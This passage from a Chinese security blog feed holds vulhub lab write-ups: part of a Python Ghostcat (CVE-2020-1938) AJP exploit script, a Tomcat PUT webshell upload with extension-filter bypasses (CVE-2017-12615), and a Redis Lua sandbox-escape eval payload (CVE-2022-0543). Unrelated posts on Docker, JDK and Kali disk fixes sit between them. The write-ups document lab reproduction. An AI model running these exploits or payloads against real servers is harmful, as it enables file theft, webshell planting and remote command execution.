continue</span><br><span class="line">            else:</span><br><span class="line">                raise NotImplementedError</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpResponse(object):</span><br><span class="line">    _, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)</span><br><span class="line">    COMMON_SEND_HEADERS = [</span><br><span class="line">        &quot;Content-Type&quot;, &quot;Content-Language&quot;, &quot;Content-Length&quot;, &quot;Date&quot;, &quot;Last-Modified&quot;,</span><br><span class="line">        &quot;Location&quot;, &quot;Set-Cookie&quot;, &quot;Set-Cookie2&quot;, &quot;Servlet-Engine&quot;, &quot;Status&quot;, &quot;WWW-Authenticate&quot;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    def parse(self, stream):</span><br><span class="line">        # read headers</span><br><span class="line">        self.magic, self.data_length, self.prefix_code = unpack(stream, &quot;&gt;HHb&quot;)</span><br><span class="line"></span><br><span class="line">        if self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">            self.parse_send_headers(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">            self.parse_send_body_chunk(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">            self.parse_end_response(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">            self.parse_get_body_chunk(stream)</span><br><span class="line">        else:</span><br><span class="line">            raise NotImplementedError</span><br><span class="line"></span><br><span class="line">    def parse_send_headers(self, stream):</span><br><span class="line">        self.http_status_code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.http_status_msg = unpack_string(stream)</span><br><span class="line">        self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.response_headers = &#123;&#125;</span><br><span class="line">        for i in range(self.num_headers):</span><br><span class="line">            code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">            if code &lt;= 0xA000:  # custom header</span><br><span class="line">                h_name, = unpack(stream, &quot;%ds&quot; % code)</span><br><span class="line">                stream.read(1)  # \0</span><br><span class="line">                h_value = unpack_string(stream)</span><br><span class="line">            else:</span><br><span class="line">                h_name = AjpResponse.COMMON_SEND_HEADERS[code - 0xA001]</span><br><span class="line">                h_value = unpack_string(stream)</span><br><span class="line">            self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">    def parse_send_body_chunk(self, stream):</span><br><span class="line">        self.data_length, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.data = stream.read(self.data_length + 1)</span><br><span class="line"></span><br><span class="line">    def parse_end_response(self, stream):</span><br><span class="line">        self.reuse, = unpack(stream, &quot;b&quot;)</span><br><span class="line"></span><br><span class="line">    def parse_get_body_chunk(self, stream):</span><br><span class="line">        rlen, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        return rlen</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def receive(stream):</span><br><span class="line">        r = AjpResponse()</span><br><span class="line">        r.parse(stream)</span><br><span class="line">        return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):</span><br><span class="line">    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">    fr.method = method</span><br><span class="line">    fr.protocol = &quot;HTTP/1.1&quot;</span><br><span class="line">    fr.req_uri = req_uri</span><br><span class="line">    fr.remote_addr = target_host</span><br><span class="line">    fr.remote_host = None</span><br><span class="line">    fr.server_name = target_host</span><br><span class="line">    fr.server_port = 80</span><br><span class="line">    fr.request_headers = &#123;</span><br><span class="line">        &#x27;SC_REQ_ACCEPT&#x27;: &#x27;text/html&#x27;,</span><br><span class="line">        &#x27;SC_REQ_CONNECTION&#x27;: &#x27;keep-alive&#x27;,</span><br><span class="line">        &#x27;SC_REQ_CONTENT_LENGTH&#x27;: &#x27;0&#x27;,</span><br><span class="line">        &#x27;SC_REQ_HOST&#x27;: target_host,</span><br><span class="line">        &#x27;SC_REQ_USER_AGENT&#x27;: &#x27;Mozilla&#x27;,</span><br><span class="line">        &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, sdch&#x27;,</span><br><span class="line">        &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class="line">        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,</span><br><span class="line">        &#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    fr.is_ssl = False</span><br><span class="line">    fr.attributes = []</span><br><span class="line">    return fr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Tomcat(object):</span><br><span class="line">    def __init__(self, target_host, target_port):</span><br><span class="line">        self.target_host = target_host</span><br><span class="line">        self.target_port = target_port</span><br><span class="line"></span><br><span class="line">        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">        self.socket.connect((target_host, target_port))</span><br><span class="line">        self.stream = self.socket.makefile(&quot;rb&quot;, buffering=0)</span><br><span class="line"></span><br><span class="line">    def perform_request(self, req_uri, headers=&#123;&#125;, method=&#x27;GET&#x27;, user=None, password=None, attributes=[]):</span><br><span class="line">        self.req_uri = req_uri</span><br><span class="line">        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,</span><br><span class="line">                                                           method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">        print(&quot;Getting resource at ajp13://%s:%d%s&quot; % (self.target_host, self.target_port, req_uri))</span><br><span class="line">        if user is not None and password is not None:</span><br><span class="line">            self.forward_request.request_headers[</span><br><span class="line">                &#x27;SC_REQ_AUTHORIZATION&#x27;] = f&#x27;Basic &#123;base64.b64encode(f&quot;&#123;user&#125;:&#123;password&#125;&quot;.encode()).decode()&#125;&#x27;</span><br><span class="line">        for h in headers:</span><br><span class="line">            self.forward_request.request_headers[h] = headers[h]</span><br><span class="line">        for a in attributes:</span><br><span class="line">            self.forward_request.attributes.append(a)</span><br><span class="line">        responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">        if len(responses) == 0:</span><br><span class="line">            return None, None</span><br><span class="line">        snd_hdrs_res = responses[0]</span><br><span class="line">        data_res = responses[1:-1]</span><br><span class="line">        if len(data_res) == 0:</span><br><span class="line">            print(&quot;No data in response. Headers:%s\n&quot; % snd_hdrs_res.response_headers)</span><br><span class="line">        return snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">javax.servlet.include.request_uri</span><br><span class="line">javax.servlet.include.path_info</span><br><span class="line">javax.servlet.include.servlet_path</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(&quot;target&quot;, type=str, help=&quot;Hostname or IP to attack&quot;)</span><br><span class="line">parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, type=int, default=8009, help=&quot;AJP port to attack (default is 8009)&quot;)</span><br><span class="line">parser.add_argument(&quot;-f&quot;, &#x27;--file&#x27;, type=str, default=&#x27;WEB-INF/web.xml&#x27;, help=&quot;file path :(WEB-INF/web.xml)&quot;)</span><br><span class="line">parser.add_argument(&#x27;--rce&#x27;, type=bool, default=False, help=&quot;read file(default) or exec command&quot;)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_, data = t.perform_request(f&#x27;/hissec&#123;&quot;.jsp&quot; if args.rce else &quot;&quot;&#125;&#x27;, attributes=[</span><br><span class="line">    &#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.request_uri&#x27;, &#x27;/&#x27;]&#125;,</span><br><span class="line">    &#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.path_info&#x27;, args.file]&#125;,</span><br><span class="line">    &#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.servlet_path&#x27;, &#x27;/&#x27;]&#125;,</span><br><span class="line">])</span><br><span class="line">print(&#x27;----------------------------&#x27;)</span><br><span class="line">print(&#x27;&#x27;.join([d.data.decode(&#x27;utf_8&#x27;) for d in data]))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327215041264.png" alt="image-20250327215041264"></p><p>然后就能在监听处执行命令了，说明getshell成功了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327215154910.png" alt="image-20250327215154910"></p><p>到此该漏洞利用结束。</p><h2 id="CVE-2017-12615">CVE-2017-12615</h2><p>PUT方法任意写文件漏洞（CVE-2017-12615）</p><blockquote><p>kali靶机：192.168.192.132</p><p>win10攻击机：192.168.192.129</p></blockquote><h3 id="漏洞原理">漏洞原理</h3><p>由于配置不当（非默认配置），将配置文件conf/web.xml中的readonly设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的文件。<br>默认情况下 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT / DELETE 进行文件操控并可以执行任意代码。</p><blockquote><p>影响范围：Apache Tomcat 7.0.0 - 7.0.81</p></blockquote><p>该版本Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3e37200026689dd67856838a099a0b3a.png" alt="img"></p><h3 id="漏洞复现-2">漏洞复现</h3><p>开启环境，并且查看配置文件conf/web.xml中的readonly是否设置为<code> false</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -ti 容器id bash</span><br><span class="line">cat conf/web.xml | grep readonly</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328143138882.png" alt="image-20250328143138882"></p><p>接下来抓包看看是GET方法，将其修改为PUT方法，上传一个shell.jsp（哥斯拉生成一个jsp马，然后用记事本打开复制代码）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328144633865.png" alt="image-20250328144633865"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328144943071.png" alt="image-20250328144943071"></p><p>响应包可以看到报错了。Tomcat 在一定程度上检查了文件后缀（不能直接写 jsp），直接上传导致报错，但我们还是可以通过一些文件系统功能绕过限制。</p><h3 id="绕过方法">绕过方法</h3><blockquote><p>方法一：使用斜杠/，斜杠在文件名中是非法的，所以会被去除（Linux和Windows中都适用）</p><p>方法二：首先使用<code>%20</code>绕过。<code>%20</code>对应的是空格，在windows中若文件这里在jsp后面添加<code>%20</code>即可达到自动抹去空格的效果。</p><p>方法三：使用Windows NTFS流，在jsp后面添加<code>::$DATA</code></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145217887.png" alt="image-20250328145217887"></p><p>上传成功，在docker容器中看看，发现有这个文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145332083.png" alt="image-20250328145332083"></p><p>使用哥斯拉连接来getshell</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145733623.png" alt="image-20250328145733623"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145804009.png" alt="image-20250328145804009"></p>]]></content>
    
    
    <summary type="html">🥧【vulhub漏洞靶场】tomcat漏洞及漏洞复现；【vulhub漏洞靶场】tomcat漏洞tomcat8及漏洞复现；【vulhub漏洞靶场】tomcat漏洞CVE-2020-1938及漏洞复现；【vulhub漏洞靶场】tomcat漏洞CVE-2017-12615及漏洞复现</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>docker-compose启动报错（library initialization failed - unable to allocate file descriptor table - out of memory#）问题解决</title>
    <link href="https://blog.m3x1.cn/posts/eab53833.html"/>
    <id>https://blog.m3x1.cn/posts/eab53833.html</id>
    <published>2025-03-26T16:00:00.000Z</published>
    <updated>2025-04-01T02:51:03.605Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="前言">前言</h2><p>我用docker开启容器靶场的时候，出现这个报错，最后出现139报错代号，然后去网上查找各种资料到处试，最后问题解决了，用这篇文章记录一下。</p><h2 id="问题描述">问题描述</h2><blockquote><p>library initialization failed - unable to allocate file descriptor table - out of memory#</p></blockquote><p>翻译过来就是说：库初始化失败 - 无法分配文件描述符表 - 内存不足#</p><h2 id="原因">原因</h2><p>(1) LimitNOFILE=<a href="https://so.csdn.net/so/search?q=infinity&amp;spm=1001.2101.3001.7020">infinity</a> 虽然是不限制，但是在systemctl版本小于234的时候不生效，查看systemctl版本：systemctl --version</p><p>(2) docker容器的ulimit太小了，有文档说太大也不行</p><h2 id="解决方法">解决方法</h2><h3 id="解决方法一">解决方法一</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#修改/lib/systemd/system/docker.service文件</span><br><span class="line"></span><br><span class="line">LimitCORE=infinity</span><br><span class="line">LimitNOFILE=infinity</span><br><span class="line">LimitNPROC=infinity</span><br><span class="line">改成</span><br><span class="line">LimitCORE=65535</span><br><span class="line">LimitNOFILE=65535</span><br><span class="line">LimitNPROC=65535</span><br><span class="line"></span><br><span class="line">#重启docker服务</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="解决方法二">解决方法二</h3><p>问题<br>因运存不足无法给进程分配更多的文件句柄数而异常退出</p><p>原运行指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run  -d -p 8080:8080 docker-test:v1.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --ulimit nofile=1024 -d -p 8080:8080 docker-test:v1.0</span><br></pre></td></tr></table></figure><p>改为</p><h3 id="解决方法三">解决方法三</h3><p>在 /etc/systemd/system/ 目录下， 创建 docker.service.d 目录<br>进入该目录，创建一个文件，名为 docker.conf<br>在文件中加入以下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart=</span><br><span class="line">ExecStart=/usr/bin/dockerd --default-ulimit nofile=65535:65535 -H fd://</span><br></pre></td></tr></table></figure><h2 id="个人总结">个人总结</h2><p>我是使用的方法一修改了一下，修改/lib/systemd/system/docker.service文件，大概如下图：</p><p>在ExecStart后面加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--default-ulimit nofile=65535:65535</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326225855172.png" alt="image-20250326225855172"></p><p>然后按方法一修改</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326225917085.png" alt="image-20250326225917085"></p><p>然后记得重启docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p>之后问题就解决了。</p>]]></content>
    
    
    <summary type="html">🥧docker-compose启动报错（library initialization failed - unable to allocate file descriptor table - out of memory#）问题解决</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>解决win10使用jar命令出现”jar不是内部或外部命令”的问题</title>
    <link href="https://blog.m3x1.cn/posts/4de01283.html"/>
    <id>https://blog.m3x1.cn/posts/4de01283.html</id>
    <published>2025-03-26T16:00:00.000Z</published>
    <updated>2025-03-28T07:09:19.032Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="分析原因">分析原因</h2><p>是因为JDK11以后就不再默认创建 “jre” 文件夹和其内容了，需要手动配置。至于如何发现没有“jre”文件夹的，是因为看环境变量的路径里有“jre”的文件夹，但是我发现JDK里并没有，就上网一搜才知道原因。</p><h2 id="配置过程">配置过程</h2><p>首先在系统变量里新建 “JAVA_HOME” 变量，变量值为：“C:\Program Files\Java\jdk-11.0.9” （路径为自己的java文件路径，以下皆是）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/04928472f8cb730ebda4a2ba1dcdafd3.png" alt="在这里插入图片描述"></p><p>在系统变量里新建 “CLASSPATH” 变量，变量值为：“.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar”</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7ea1758748f9266cd43b8d6ab6cfab4b.png" alt="在这里插入图片描述"></p><p>在系统变量里找到“Path” 变量，变量值为：“%JAVA_HOME%\bin”和”JAVA_HOME%\jre\bin”</p><p>这里注意，如果是如下图所示编辑界面（下图是错误示范），需要分两行添加上述变量值</p><p>如果”变量名+变量值“的样子（就像上面的配置图差不多），才用;连接（“%JAVA_HOME%\bin;JAVA_HOME%\jre\bin”）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0d63d1cc8ee295263419c0718e809542.png" alt="在这里插入图片描述"></p><p>接下来是重点了：</p><p>生成 “jre” 文件夹和其内容。<br>进入到安装目录下(C:\Program Files\Java\jdk-11.0.9)，在此处运行cmd，再输入：“bin\jlink.exe --module-path jmods --add-modules java.desktop --output jre”<br>这时候接着直接输入 “jar” 的话，还是会有错误：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b5371d495aabde202119568ba3c8b47a.png" alt="在这里插入图片描述"></p><p>直接关掉，重新开一个cmd就行了，直接按 “开始键” + “R&quot;，输入：“cmd”。这时候再试试：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/64d1016243b22e94e1a0b1aa07f73f15.png" alt="在这里插入图片描述"></p><p>这样就是成功了，然后就能使用jar了。</p><blockquote><p>参考文章：<a href="https://blog.csdn.net/sinat_20593627/article/details/109613547">win10解决‘jar’不是内部或外部命令，也不是可运行的程序 的问题_jar’ 不是内部或外部命令,也不是可运行的程序 或批处理文件。-CSDN博客</a></p></blockquote>]]></content>
    
    
    <summary type="html">🥧解决win10使用jar命令出现”jar不是内部或外部命令”的问题；windows10下载了java但是无法使用jar命令的问题原因和问题解决</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>kali扩展硬盘，以及导致开机延迟问题，一直卡在登录界面的问题解决</title>
    <link href="https://blog.m3x1.cn/posts/3b44ba93.html"/>
    <id>https://blog.m3x1.cn/posts/3b44ba93.html</id>
    <published>2025-03-25T16:00:00.000Z</published>
    <updated>2025-03-26T15:03:28.600Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="扩展硬盘">扩展硬盘</h2><p>今天我因为看到原来的kali虚拟机只有20g内存，就想扩展一下</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101617857-2116683396.png" alt="image-20220829233729344"></p><p>点开上面这个硬盘这一栏</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101618295-1284516527.png" alt="image-20220829233757522"></p><p>点开之后点击扩展，然后选择自己想要扩展的空间，这里根据自己情况自己决定</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101618752-1960261044.png" alt="image-20220829233824985"></p><p>在上述扩展磁盘容量之后，并不会直接把容量扩展到系统盘里，还需要我们自己去分配。</p><p>右上角搜索Gparted，kali有一个自带的分配磁盘空间的工具</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101619237-528678126.png" alt="image-20220830090014908"></p><p>本来是这样一个界面</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101619573-866531015.png" alt="image-20220830090052673"></p><p>然后右键点击停用交换空间，然后把中间这两个分区删除，只剩下sda1那个分区，因为如果存在中间这两个分区，就不能把扩展的磁盘空间分配给系统盘了。</p><p>中间的区域删除之后，就会只剩下一个sda1那个分区，然后就可以开始调整大小了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101619970-1314137064.png" alt="image-20220830090331897"></p><p>然后下面这个地方就会变化，变成你之前扩展的空间容量</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101620377-953480513.png" alt="image-20220830090502454"></p><p>然后你自行进行分配即可，不过这里注意要留出一些空间给交换区域，因为我们后面还是要重新建回原来的那个swap分区</p><p>如果你留有一部分空间的话，应该是可以点击新建分区的</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101620763-1046461728.png" alt="image-20220830090933936"></p><p>新建的分区文件系统要和原来一样，原来是extended的，新建的分区也要是extended的，然后那个swap分区也要在这个extended分区之下去建立。然后完成后开机发现变得很慢。</p><h2 id="开机延迟问题解决">开机延迟问题解决</h2><p>因为有一个关于uuid的信息我们还没有修改。</p><p>在linux中，uuid是通用唯一识别码。uuid是一个软件建构的标准，目的就是让分布式系统中的所用元素都能有唯一的辨识资讯，从而不需要透过中央控制端来做识别资讯的指定</p><p>大概意思就是一个识别码，如果你没有进行重新修改的话，你开机的时候还是会去寻找原来的uuid，因为我们这里已经删除重建过了分区，所以它的uuid码也发生了变化</p><p>通过下面这个命令可以查看uuid码</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo blkid</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101621219-13902332.png" alt="image-20220830091830957"></p><p>然后我们需要修改两个文件的uuid码</p><p>分别是/etc/fstab和/etc/initramfs-tools/conf.d/resume</p><p>我们可以用vim打开，如果你有其它编辑器，也可以用其它编辑器</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br><span class="line">sudo vim /etc/initramfs-tools/conf.d/resume</span><br></pre></td></tr></table></figure><p>可能会出现下面的界面，直接按E开始编辑就可以</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101621646-272993183.png" alt="image-20220830092204947"></p><p>接下去就是vim的一个编辑界面</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101622029-954380503.png" alt="image-20220830092232770"></p><p>需要把上面的两个uuid分别改成对应的uuid，因为系统盘没变，所以这个ext4的uuid一般是不需要改变的，一般要改的就是下面的这个swap的uuid。改完保存后重启即可。</p>]]></content>
    
    
    <summary type="html">🥧kali扩展硬盘，以及导致开机延迟问题，一直卡在登录界面的问题解决；vm虚拟机kali扩展硬盘教程；kali扩展硬盘后的开机慢问题解决方法</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【vulhub漏洞靶场】redis漏洞（沙盒逃逸）CVE-2022-0543及漏洞复现</title>
    <link href="https://blog.m3x1.cn/posts/50ac647a.html"/>
    <id>https://blog.m3x1.cn/posts/50ac647a.html</id>
    <published>2025-03-25T16:00:00.000Z</published>
    <updated>2025-03-26T15:03:28.615Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="漏洞详情">漏洞详情</h2><h3 id="受影响的系统">受影响的系统</h3><ul><li><strong>仅限于 Debian 系 Linux 发行版</strong>（如 Debian、Ubuntu）及其衍生版本。</li><li><strong>不受影响的系统</strong>：CentOS、RHEL 等非 Debian 系发行版不受此漏洞影响（漏洞源于 Debian 维护者在打包 Redis 时的补丁问题，而非 Redis 自身代码问题）。</li></ul><h3 id="受影响的-Redis-版本范围">受影响的 Redis 版本范围</h3><ul><li>redis版本小于等于6.x的都可以尝试。</li></ul><h3 id="触发条件">触发条件</h3><p>攻击者需具备 Redis 的未授权访问权限或合法凭证。</p><h2 id="漏洞原理">漏洞原理</h2><h3 id="背景">背景</h3><p>Redis 允许通过 <code>eval</code> 命令执行 Lua 脚本，但正常情况下这些脚本运行在沙箱中，无法执行系统命令或文件操作。</p><h3 id="补丁引入的漏洞">补丁引入的漏洞</h3><p>Debian/Ubuntu 在打包 Redis 时，通过补丁代码向 Lua 沙箱中注入了一个名为 <code>package</code> 的全局对象。该对象本应在源码中被注释（出于沙箱安全考虑），但补丁错误地重新启用了它。</p><h3 id="沙盒逃逸过程">沙盒逃逸过程</h3><ul><li><strong>加载动态库</strong>：攻击者可通过 <code>package.loadlib</code> 加载 Lua 系统库（如 <code>liblua5.1.so.0</code>），调用其导出函数（如 <code>luaopen_io</code>）获取 <code>io</code> 库权限。</li><li><strong>执行命令</strong>：利用 <code>io.popen</code> 等函数执行任意系统命令。</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> io_l = <span class="built_in">package</span>.<span class="built_in">loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">io</span> = io_l();</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;r&quot;</span>);  <span class="comment">-- 执行系统命令</span></span><br><span class="line"><span class="keyword">local</span> res = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>);</span><br><span class="line">f:<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure><h2 id="攻击思路">攻击思路</h2><p>单从攻击角度而言，可以使用redis未授权相同的打法，博客见：<a href="https://www.cnblogs.com/MrSoap/p/18737580">【vulhub】redis 4-unacc （redis未授权访问） - Mr_Soap - 博客园</a></p><p>从漏洞角度来看，使用<code>eval</code>函数执行上面的逃逸过程即可。</p><h2 id="漏洞复现">漏洞复现</h2><blockquote><p>kali靶机：192.168.192.132</p><p>kali攻击机：192.168.192.135</p></blockquote><p>靶机进入vulhub-master/redis/CVE-2022-0543中，使用docker启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326161957788.png" alt="image-20250326161957788"></p><p>攻击机进行redis未授权连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.192.132</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162311984.png" alt="image-20250326162311984"></p><p>进行getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);local io = io_l();local f = io.popen(&quot;whoami&quot;, &quot;r&quot;);local res = f:read(&quot;*a&quot;);f:close();return res;&#x27; 0</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162631517.png" alt="image-20250326162631517"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162822769.png" alt="image-20250326162822769"></p><p>说明已经能进行命令执行了。</p>]]></content>
    
    
